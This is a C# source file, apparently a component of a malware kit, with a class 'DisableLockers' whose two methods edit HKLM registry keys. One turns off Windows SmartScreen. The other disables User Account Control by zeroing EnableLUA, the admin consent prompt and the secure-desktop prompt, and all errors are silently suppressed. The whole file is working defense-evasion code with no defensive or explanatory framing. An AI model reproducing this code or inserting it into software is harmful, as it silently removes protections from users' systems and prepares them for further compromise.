namespace PEngine.Sticks
{
    using Microsoft.Win32;
    using System;

    public class DisableLockers
    {
        public static bool SmartScreen(int nStatus = 0)
        {
            try
            {
                using (var hklmHive = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
                {
                    using (RegistryKey Key = hklmHive.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", Environment.Is64BitOperatingSystem ? true : false))
                    {
                        Key?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
                        using (RegistryKey Key2 = hklmHive.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", Environment.Is64BitOperatingSystem ? true : false))
                        {
                            Key2?.SetValue("EnableSmartScreen", nStatus, RegistryValueKind.DWord);
                        }
                        return true;
                    }
                }
            }
            catch { return false; }
        }

        public static bool UAC(int Status = 0)
        {
            try
            {
                using (var hklmHive = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
                {
                    using (RegistryKey runKey = hklmHive?.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", Environment.Is64BitOperatingSystem ? true : false))
                    {
                        runKey?.SetValue("EnableLUA", Status, RegistryValueKind.DWord);
                        runKey?.SetValue("ConsentPromptBehaviorAdmin", Status, RegistryValueKind.DWord);
                        runKey?.SetValue("PromptOnSecureDesktop", Status, RegistryValueKind.DWord);
                    }
                    return true;
                }
            }
            catch { return false; }
        }
    }
}